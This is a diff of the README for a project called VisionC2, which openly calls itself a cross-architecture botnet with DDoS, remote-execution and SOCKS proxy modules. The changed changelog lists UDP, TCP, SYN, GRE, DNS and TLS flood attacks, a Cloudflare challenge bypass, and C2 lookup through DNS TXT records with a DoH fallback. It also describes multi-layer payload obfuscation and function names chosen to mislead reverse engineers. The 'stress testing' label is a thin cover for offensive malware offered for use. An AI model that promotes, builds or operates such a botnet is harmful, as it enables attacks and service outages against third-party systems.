@@ -5,7 +5,29 @@
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
 ![License](https://img.shields.io/badge/License-MIT-yellow)
 
-**VisionC2** is an advanced cross-arch botnet focused on network stress testing it features end-to-end TLS 1.3 encryption, anti-analysis techniques, and DDOS/RCE/SOCKS modules. Vision is built to be setup via setup script meaning there are no code changes required.
+**VisionC2** 
+*is an advanced cross-arch botnet focused on network stress testing it features end-to-end TLS 1.3 encryption, anti-analysis techniques, and DDOS/RCE/SOCKS modules. Vision is built to be setup via setup script meaning there are no code changes required.*
+
+## 📋 Changelog
+
+### v3.3 - January 2026
+
+- `!stop` command - Instantly halt all running attacks
+- HTTPS/TLS 1.3 flood attack with HTTP/2 fingerprinting
+- Cloudflare UAM bypass attack
+- DNS TXT record C2 resolution with DoH fallback
+- Multi-layer encryption (RC4 + XOR + byte substitution + MD5)
+- Setup wizard with menu system (Full Setup / C2 Update Only)
+- Fixed SOCKS5 proxy, target resolution, telnet handling
+- Anti-analysis obfuscation (meaningless function names)
+
+### v3.1 - January 2026
+
+- Initial release with TLS 1.3 encrypted communications
+- 14 architecture cross-compilation support
+- HMAC challenge-response authentication
+
+---
 
 
 <img width="828" height="1335" alt="Screenshot 2026-01-28 200534" src="https://github.com/user-attachments/assets/fb441aec-de8c-453f-8a65-3018a4055532" />
@@ -131,76 +153,6 @@ nc YOUR_IP YOUR_ADMIN_PORT
 # Bot binaries ready in: bot/bins/
 optional: protect UPX packed binaries from string analysis https://github.com/Syn2Much/upx-stripper
 ```
-
----
-
-## 📋 Changelog
-
-### v3.3 - January 29, 2026
-
-#### 🚀 New Features
-
-- **Stop All Attacks** (`!stop`) - Instantly terminates all running attacks across all bots from CNC or per-bot
-- **Anti-Analysis Obfuscation** - All bot function names now use Pokemon & APT group names to confuse reverse engineers:
-  - Attack functions: `snorlax` (UDP), `gengar` (TCP), `alakazam` (HTTP), `machamp` (HTTPS), `gyarados` (CFBypass), `dragonite` (SYN), `tyranitar` (ACK), `metagross` (GRE), `salamence` (DNS)
-  - APT group names: `fancyBear`, `cozyBear`, `lazarus`, `turla`, `kimsuky`, `carbanak`, `fin7`, `dragonfly`, `winnti`, `scarcruft`, `gamaredon`, `mustangPanda`, `hafnium`, `charmingKitten`, `sidewinder`, `oceanLotus`, `machete`, `muddywater`, `emotet`, `trickbot`, `blackEnergy`, `anonymousSudan`
-  - Utility functions: `pikachu` (stop attacks), `raichu` (get stop channel), `lucario` (resolve target), `charizard` (derive key), `blastoise` (RC4), `venusaur` (decode), `darkrai` (DNS TXT), `palkia` (DoH lookup)
-
-#### 🔧 Bug Fixes
-
-- **Global attack stop channel** - Thread-safe stop mechanism using mutex-protected channel recreation
-- **Attack coordination** - All attack goroutines now listen on stop channel for instant termination
-- **Setup.py compatibility** - Updated regex patterns and comments to work with obfuscated function names (mew/mewtwo/celebi/jirachi)
-
----
-
-
-#### Bot Updates  
-
-- **HTTPS/TLS Flood Attack** (`!https`, `!tls`) - High-performance TLS 1.3 flood with HTTP/2 fingerprinting, random SNI, and proper handshake completion
-- **Cloudflare Bypass Attack** (`!cfbypass`) - Bypasses Cloudflare UAM challenge with JavaScript execution simulation, cookie persistence, and proper browser fingerprinting
-- **DNS TXT Record C2 Lookup** - Bot can resolve C2 address from DNS TXT records for domain-fronting style obfuscation; falls back to Cloudflare DoH if system DNS fails
-- **Setup Menu System** - `setup.py` now offers two modes:
-  - `[1] Full Setup` - Fresh install with new magic code, certs, everything
-  - `[2] C2 URL Update Only` - Change domain while keeping existing magic code & certs (for server migration)
-
-#### 🛡️ Security Enhancements
-
-- **Multi-Layer Obfuscation** - Upgraded from simple XOR+Base64 to 4-layer encryption:
-  - Layer 1: Base64 decode
-  - Layer 2: XOR with derived key (SHA256 of cryptSeed)
-  - Layer 3: RC4 stream cipher decryption
-  - Layer 4: Byte substitution reversal with MD5 checksum verification
-- **CryptSeed Generation** - Random 32-char seed generated per deployment for unique obfuscation keys
-- **Obfuscation Verification** - Setup wizard verifies encode/decode cycle before deployment
-
-#### 🔧 Bug Fixes
-
-- **Fixed SOCKS5 Proxy** - Corrected buffer sizes, added proper timeouts, fixed TCP half-close handling
-- **Fixed Target Resolution** - All attack methods (SYN, ACK, GRE, DNS, UDP, TCP) now resolve hostnames via `resolveTarget()` - URLs work as targets
-- **Fixed DNS Resolution** - Added system DNS with Cloudflare DoH fallback for reliable target resolution
-- **Fixed EOF spam in C2 logs** - Removed noisy `println(err.Error())` calls that flooded logs
-- **Fixed Ctrl+C handling** - Added proper telnet negotiation (IAC WILL ECHO, WILL SGA, WONT LINEMODE)
-- **Fixed PuTTY terminal glitches** - Telnet protocol negotiation properly configures terminal mode
-- **Fixed connection cleanup** - Added `defer conn.Close()` for proper resource cleanup
-- **Fixed buffered reader issues** - Single `bufio.Reader` per connection instead of new ones each loop
-
-#### ✨ Improvements
-
-- **Redesigned help menu** - Fixed alignment, 64-character width box, added new attack commands
-- **New intricate banner** - Complete redesign with gradient ASCII art and live stats
-- **Silent error handling** - No information leakage via logs on disconnect
-
----
-
-### v3.1 - January 2026
-
-#### 🔧 Initial Fixes
-
-- Basic telnet negotiation
-- Help menu alignment
-- Banner redesign
-
 
 ---
 
